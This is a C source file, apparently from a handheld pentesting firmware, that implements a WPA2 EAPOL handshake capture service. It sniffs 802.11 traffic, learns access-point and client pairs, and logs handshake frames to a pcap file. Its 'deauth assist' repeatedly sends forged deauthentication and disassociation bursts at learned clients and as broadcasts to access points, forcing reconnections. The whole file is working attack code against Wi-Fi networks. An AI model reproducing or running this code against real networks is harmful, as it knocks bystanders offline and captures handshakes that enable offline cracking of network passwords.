/*
 * wifi_eapol_svc.c - WPA2 EAPOL handshake capture service.
 *
 * EAPOL detection:
 *   802.11 data frames carry EAPOL via LLC/SNAP encapsulation.
 *   Pattern: AA AA 03  00 00 00  88 8E  (LLC + SNAP EtherType 0x888E)
 *
 * Learning mode:
 *   The service learns AP<->STA pairs from ordinary 802.11 data/management
 *   frames before EAPOL appears.  The deauth assist then targets learned pairs
 *   on the currently sniffed channel instead of blindly firing at every AP.
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI

#include "wifi_eapol_svc.h"
#include "wifi_sniffer_svc.h"
#include "wifi_common.h"
#include "bs/bs_fs.h"

#include <string.h>
#include <stdbool.h>
#include <stdint.h>

/* ── Tunables ────────────────────────────────────────────────────────────── */

#define EAPOL_DEAUTH_DEFAULT_IVL_MS  5000u
#define EAPOL_DEAUTH_DEFAULT_BURST   3u
#define EAPOL_DEAUTH_DEFAULT_REASON  7u
#define EAPOL_MAX_PAIRS              16   /* EAPOL BSSID+STA pairs tracked */
#define EAPOL_MAX_LINKS              32   /* learned AP<->STA traffic pairs */
#define EAPOL_MAX_APS                24
#define EAPOL_LINK_STALE_MS          120000u

/* ── Records ────────────────────────────────────────────────────────────── */

typedef struct {
    uint8_t bssid[6];
    uint8_t sta[6];
    uint8_t flags;    /* bit 0: AP→STA EAPOL seen, bit 1: STA→AP EAPOL seen */
} eapol_pair_t;

typedef struct {
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint8_t  channel;
    int8_t   rssi;
    uint32_t last_seen_ms;
    uint8_t  flags;      /* bit0 AP->STA traffic, bit1 STA->AP traffic */
} eapol_link_t;

typedef struct {
    uint8_t  bssid[6];
    uint8_t  channel;
    int8_t   rssi;
    uint32_t last_seen_ms;
} eapol_ap_t;

/* ── State ─────────────────────────────────────────────────────────────── */

static bool               s_active         = false;
static uint8_t            s_target_bssid[6];
static bool               s_has_bssid      = false;
static eapol_deauth_cfg_t s_deauth_cfg;
static uint32_t           s_last_deauth_ms = 0;
static uint32_t           s_deauth_frames  = 0;

static uint32_t           s_eapol_count    = 0;
static int                s_pair_slots     = 0;
static eapol_pair_t       s_pairs[EAPOL_MAX_PAIRS];

static int                s_link_count     = 0;
static eapol_link_t       s_links[EAPOL_MAX_LINKS];
static int                s_ap_count       = 0;
static eapol_ap_t         s_aps[EAPOL_MAX_APS];

static bs_file_t          s_pcap_f         = NULL;
static uint32_t           s_pcap_frames    = 0;

/* ── Small helpers ──────────────────────────────────────────────────────── */

static bool mac_is_bcast(const uint8_t m[6]) {
    return m[0] == 0xFF && m[1] == 0xFF && m[2] == 0xFF &&
           m[3] == 0xFF && m[4] == 0xFF && m[5] == 0xFF;
}

static bool mac_is_zero(const uint8_t m[6]) {
    return m[0] == 0 && m[1] == 0 && m[2] == 0 &&
           m[3] == 0 && m[4] == 0 && m[5] == 0;
}

static bool mac_is_group(const uint8_t m[6]) {
    return (m[0] & 0x01) != 0;
}

static bool mac_is_usable_unicast(const uint8_t m[6]) {
    return !mac_is_zero(m) && !mac_is_bcast(m) && !mac_is_group(m);
}

static bool bssid_allowed(const uint8_t bssid[6]) {
    return !s_has_bssid || memcmp(bssid, s_target_bssid, 6) == 0;
}

/* ── pcap helpers ───────────────────────────────────────────────────────── */

static void pcap_open(const char* path) {
    s_pcap_f = bs_fs_open(path, "w");
    if (!s_pcap_f) return;
    static const uint8_t k_hdr[24] = {
        0xd4,0xc3,0xb2,0xa1,  /* magic 0xa1b2c3d4 LE */
        0x02,0x00, 0x04,0x00, /* version 2.4 */
        0x00,0x00,0x00,0x00,  /* thiszone 0 */
        0x00,0x00,0x00,0x00,  /* sigfigs 0 */
        0xff,0xff,0x00,0x00,  /* snaplen 65535 */
        0x69,0x00,0x00,0x00,  /* DLT_IEEE802_11 = 105 */
    };
    bs_fs_write(s_pcap_f, k_hdr, 24);
    s_pcap_frames = 0;
}

static void pcap_write(const uint8_t* data, uint16_t len, uint32_t ts_ms) {
    if (!s_pcap_f) return;
    uint32_t hdr[4];
    hdr[0] = ts_ms / 1000;
    hdr[1] = (ts_ms % 1000) * 1000;
    hdr[2] = hdr[3] = (uint32_t)len;
    bs_fs_write(s_pcap_f, hdr, 16);
    bs_fs_write(s_pcap_f, data, len);
    s_pcap_frames++;
}

static void pcap_close(void) {
    if (s_pcap_f) {
        bs_fs_close(s_pcap_f);
        s_pcap_f = NULL;
    }
}

/* ── EAPOL detection ────────────────────────────────────────────────────── */

static bool is_eapol(const uint8_t* frame, uint16_t len) {
    if (len < 24 + 8 + 4) return false;
    if (((frame[0] >> 2) & 0x03) != 2) return false;
    int offs = ((frame[0] & 0x08) != 0) ? 26 : 24;
    if ((uint16_t)(offs + 8) > len) return false;
    return (frame[offs+0] == 0xAA && frame[offs+1] == 0xAA &&
            frame[offs+2] == 0x03 && frame[offs+3] == 0x00 &&
            frame[offs+4] == 0x00 && frame[offs+5] == 0x00 &&
            frame[offs+6] == 0x88 && frame[offs+7] == 0x8E);
}

/* ── AP/link learning ───────────────────────────────────────────────────── */

static void ap_learn(const uint8_t bssid[6], uint8_t channel,
                     int8_t rssi, uint32_t ts_ms) {
    if (!mac_is_usable_unicast(bssid) || !bssid_allowed(bssid)) return;
    if (channel == 0) channel = sniffer_svc_channel();
    for (int i = 0; i < s_ap_count; i++) {
        if (memcmp(s_aps[i].bssid, bssid, 6) == 0) {
            s_aps[i].channel = channel;
            s_aps[i].rssi = rssi;
            s_aps[i].last_seen_ms = ts_ms;
            return;
        }
    }
    if (s_ap_count < EAPOL_MAX_APS) {
        memcpy(s_aps[s_ap_count].bssid, bssid, 6);
        s_aps[s_ap_count].channel = channel;
        s_aps[s_ap_count].rssi = rssi;
        s_aps[s_ap_count].last_seen_ms = ts_ms;
        s_ap_count++;
    }
}

static void link_learn(const uint8_t bssid[6], const uint8_t sta[6],
                       uint8_t channel, int8_t rssi, uint32_t ts_ms,
                       uint8_t dir_bit) {
    if (!mac_is_usable_unicast(bssid) || !mac_is_usable_unicast(sta)) return;
    if (memcmp(bssid, sta, 6) == 0) return;
    if (!bssid_allowed(bssid)) return;
    if (channel == 0) channel = sniffer_svc_channel();
    ap_learn(bssid, channel, rssi, ts_ms);

    for (int i = 0; i < s_link_count; i++) {
        if (memcmp(s_links[i].bssid, bssid, 6) == 0 &&
            memcmp(s_links[i].sta, sta, 6) == 0) {
            s_links[i].channel = channel;
            s_links[i].rssi = rssi;
            s_links[i].last_seen_ms = ts_ms;
            s_links[i].flags |= dir_bit;
            return;
        }
    }
    if (s_link_count < EAPOL_MAX_LINKS) {
        memcpy(s_links[s_link_count].bssid, bssid, 6);
        memcpy(s_links[s_link_count].sta, sta, 6);
        s_links[s_link_count].channel = channel;
        s_links[s_link_count].rssi = rssi;
        s_links[s_link_count].last_seen_ms = ts_ms;
        s_links[s_link_count].flags = dir_bit;
        s_link_count++;
    }
}

/* Extract likely AP/STA from an 802.11 frame.  This is intentionally cautious:
 * it trusts DS bits for data frames and AP-like management frames for mgmt. */
static bool extract_link(const uint8_t* frame, uint16_t len,
                         const uint8_t** bssid, const uint8_t** sta,
                         int* direction) {
    if (len < 24) return false;
    uint8_t type    = (frame[0] >> 2) & 0x03;
    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    bool to_ds      = (frame[1] & 0x01) != 0;
    bool from_ds    = (frame[1] & 0x02) != 0;

    const uint8_t* a1 = frame + 4;
    const uint8_t* a2 = frame + 10;
    const uint8_t* a3 = frame + 16;

    if (type == 2) { /* data */
        if (to_ds && !from_ds) {          /* STA -> AP */
            *bssid = a1; *sta = a2; *direction = 1; return true;
        }
        if (!to_ds && from_ds) {          /* AP -> STA */
            *bssid = a2; *sta = a1; *direction = 0; return true;
        }
        if (!to_ds && !from_ds) {         /* IBSS/simple mgmt-like data */
            if (memcmp(a2, a3, 6) == 0) { *bssid = a2; *sta = a1; *direction = 0; return true; }
            if (memcmp(a1, a3, 6) == 0) { *bssid = a1; *sta = a2; *direction = 1; return true; }
        }
        return false;
    }

    if (type == 0) { /* management */
        if (subtype == 8 || subtype == 5) {       /* beacon / probe response */
            *bssid = a3; *sta = NULL; *direction = -1; return true;
        }
        if (subtype == 0 || subtype == 2 || subtype == 11) { /* assoc/reassoc/auth request */
            *bssid = a3; *sta = a2; *direction = 1; return true;
        }
        if (subtype == 1 || subtype == 3) {       /* assoc/reassoc response */
            *bssid = a3; *sta = a1; *direction = 0; return true;
        }
        if (subtype == 10 || subtype == 12) {     /* disassoc/deauth: infer from BSSID field */
            if (memcmp(a2, a3, 6) == 0) { *bssid = a2; *sta = a1; *direction = 0; return true; }
            if (memcmp(a1, a3, 6) == 0) { *bssid = a1; *sta = a2; *direction = 1; return true; }
        }
    }

    return false;
}

static void learn_from_frame(const uint8_t* frame, uint16_t len,
                             int8_t rssi, uint32_t ts_ms) {
    const uint8_t* bssid = NULL;
    const uint8_t* sta = NULL;
    int direction = -1;
    if (!extract_link(frame, len, &bssid, &sta, &direction) || !bssid) return;
    uint8_t ch = sniffer_svc_channel();
    if (sta)
        link_learn(bssid, sta, ch, rssi, ts_ms, direction == 0 ? 0x01 : 0x02);
    else
        ap_learn(bssid, ch, rssi, ts_ms);
}

/* ── EAPOL pair tracking ───────────────────────────────────────────────── */

static void pair_update(const uint8_t bssid[6], const uint8_t sta[6],
                        int direction) {
    for (int i = 0; i < s_pair_slots; i++) {
        if (memcmp(s_pairs[i].bssid, bssid, 6) == 0 &&
            memcmp(s_pairs[i].sta,   sta,   6) == 0) {
            s_pairs[i].flags |= (uint8_t)(1 << direction);
            return;
        }
    }
    if (s_pair_slots < EAPOL_MAX_PAIRS) {
        memcpy(s_pairs[s_pair_slots].bssid, bssid, 6);
        memcpy(s_pairs[s_pair_slots].sta,   sta,   6);
        s_pairs[s_pair_slots].flags = (uint8_t)(1 << direction);
        s_pair_slots++;
    }
}

/* ── Sniffer callback ───────────────────────────────────────────────────── */

static void eapol_pkt_cb(const uint8_t* frame, uint16_t len,
                         int8_t rssi, uint32_t ts_ms, void* ctx) {
    (void)ctx;

    learn_from_frame(frame, len, rssi, ts_ms);

    if (!is_eapol(frame, len)) return;

    const uint8_t* bssid = NULL;
    const uint8_t* sta = NULL;
    int direction = -1;
    if (!extract_link(frame, len, &bssid, &sta, &direction) || !bssid || !sta)
        return;
    if (!bssid_allowed(bssid)) return;

    s_eapol_count++;
    pcap_write(frame, len, ts_ms);
    pair_update(bssid, sta, direction == 0 ? 0 : 1);
}

/* ── Deauth assist ──────────────────────────────────────────────────────── */

static void send_one_mgmt(uint8_t subtype_deauth, const uint8_t dst[6],
                          const uint8_t src[6], const uint8_t bssid[6],
                          uint16_t reason) {
    uint8_t frame[DEAUTH_FRAME_LEN];
    if (subtype_deauth)
        wifi_build_deauth(frame, dst, src, bssid, reason);
    else
        wifi_build_disassoc(frame, dst, src, bssid, reason);
    if (bs_wifi_send_raw(BS_WIFI_IF_STA, frame, DEAUTH_FRAME_LEN) == 0)
        s_deauth_frames++;
}

static void send_target(const uint8_t dst[6], const uint8_t src[6],
                        const uint8_t bssid[6]) {
    uint8_t  burst  = s_deauth_cfg.burst ? s_deauth_cfg.burst : EAPOL_DEAUTH_DEFAULT_BURST;
    uint16_t reason = s_deauth_cfg.reason ? s_deauth_cfg.reason : EAPOL_DEAUTH_DEFAULT_REASON;
    for (uint8_t i = 0; i < burst; i++) {
        send_one_mgmt(1, dst, src, bssid, reason);
        if (s_deauth_cfg.disassoc)
            send_one_mgmt(0, dst, src, bssid, reason);
    }
}

static void do_deauth_burst(uint32_t now_ms) {
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    eapol_deauth_mode_t mode = s_deauth_cfg.mode;
    if (mode == EAPOL_DEAUTH_OFF) return;

    uint8_t cur_ch = sniffer_svc_channel();

    if (mode == EAPOL_DEAUTH_BROADCAST_APS ||
        mode == EAPOL_DEAUTH_PAIRS_AND_BCAST) {
        for (int i = 0; i < s_ap_count; i++) {
            if (s_aps[i].channel != cur_ch) continue;
            if ((now_ms - s_aps[i].last_seen_ms) > EAPOL_LINK_STALE_MS) continue;
            send_target(bcast, s_aps[i].bssid, s_aps[i].bssid);
        }
    }

    if (mode == EAPOL_DEAUTH_LEARNED_PAIRS ||
        mode == EAPOL_DEAUTH_PAIRS_AND_BCAST) {
        for (int i = 0; i < s_link_count; i++) {
            if (s_links[i].channel != cur_ch) continue;
            if ((now_ms - s_links[i].last_seen_ms) > EAPOL_LINK_STALE_MS) continue;
            send_target(s_links[i].sta, s_links[i].bssid, s_links[i].bssid); /* AP -> STA */
            if (s_deauth_cfg.bidir)
                send_target(s_links[i].bssid, s_links[i].sta, s_links[i].bssid); /* STA -> AP */
        }
    }
}

/* ── Lifecycle ─────────────────────────────────────────────────────────── */

void eapol_svc_init(const bs_arch_t* arch) {
    (void)arch;
    sniffer_svc_init(arch);
}

bool eapol_svc_start_cfg(uint8_t channel, const uint8_t* bssid,
                         const eapol_deauth_cfg_t* deauth_cfg,
                         const char* pcap_path) {
    if (s_active) eapol_svc_stop();

    if (bssid) {
        memcpy(s_target_bssid, bssid, 6);
        s_has_bssid = true;
    } else {
        memset(s_target_bssid, 0, sizeof s_target_bssid);
        s_has_bssid = false;
    }

    memset(&s_deauth_cfg, 0, sizeof s_deauth_cfg);
    if (deauth_cfg) s_deauth_cfg = *deauth_cfg;
    if (s_deauth_cfg.mode != EAPOL_DEAUTH_OFF) {
        if (s_deauth_cfg.interval_ms == 0) s_deauth_cfg.interval_ms = EAPOL_DEAUTH_DEFAULT_IVL_MS;
        if (s_deauth_cfg.burst == 0)       s_deauth_cfg.burst       = EAPOL_DEAUTH_DEFAULT_BURST;
        if (s_deauth_cfg.reason == 0)      s_deauth_cfg.reason      = EAPOL_DEAUTH_DEFAULT_REASON;
    }
    s_last_deauth_ms = 0;
    s_deauth_frames  = 0;

    s_eapol_count = 0;
    s_pair_slots  = 0;
    s_link_count  = 0;
    s_ap_count    = 0;
    memset(s_pairs, 0, sizeof s_pairs);
    memset(s_links, 0, sizeof s_links);
    memset(s_aps,   0, sizeof s_aps);

    if (pcap_path) pcap_open(pcap_path);

    sniffer_svc_start(channel, 500, eapol_pkt_cb, NULL);
    s_active = true;
    return true;
}

bool eapol_svc_start(uint8_t channel, const uint8_t* bssid,
                     bool do_deauth, uint32_t deauth_ivl,
                     const char* pcap_path) {
    eapol_deauth_cfg_t cfg;
    memset(&cfg, 0, sizeof cfg);
    if (do_deauth && bssid) {
        cfg.mode        = EAPOL_DEAUTH_BROADCAST_APS;
        cfg.interval_ms = deauth_ivl;
        cfg.burst       = EAPOL_DEAUTH_DEFAULT_BURST;
        cfg.reason      = EAPOL_DEAUTH_DEFAULT_REASON;
        cfg.bidir       = false;
        cfg.disassoc    = true;
    }
    return eapol_svc_start_cfg(channel, bssid, &cfg, pcap_path);
}

void eapol_svc_stop(void) {
    sniffer_svc_stop();
    pcap_close();
    s_active = false;
}

void eapol_svc_tick(uint32_t now_ms) {
    if (!s_active) return;
    sniffer_svc_tick(now_ms);
    if (s_deauth_cfg.mode != EAPOL_DEAUTH_OFF) {
        uint32_t ivl = s_deauth_cfg.interval_ms ? s_deauth_cfg.interval_ms
                                                : EAPOL_DEAUTH_DEFAULT_IVL_MS;
        if (s_last_deauth_ms == 0 || (now_ms - s_last_deauth_ms) >= ivl) {
            s_last_deauth_ms = now_ms;
            do_deauth_burst(now_ms);
        }
    }
}

/* ── Getters ────────────────────────────────────────────────────────────── */

bool     eapol_svc_active(void)      { return s_active; }
uint32_t eapol_svc_eapol_count(void) { return s_eapol_count; }

int eapol_svc_pair_count(void) {
    int n = 0;
    for (int i = 0; i < s_pair_slots; i++)
        if (s_pairs[i].flags == 0x03) n++;
    return n;
}

int      eapol_svc_learned_count(void) { return s_link_count; }
int      eapol_svc_ap_count(void)      { return s_ap_count; }
uint32_t eapol_svc_pcap_frames(void)   { return s_pcap_frames; }
uint32_t eapol_svc_deauth_frames(void) { return s_deauth_frames; }

#endif /* BS_HAS_WIFI */
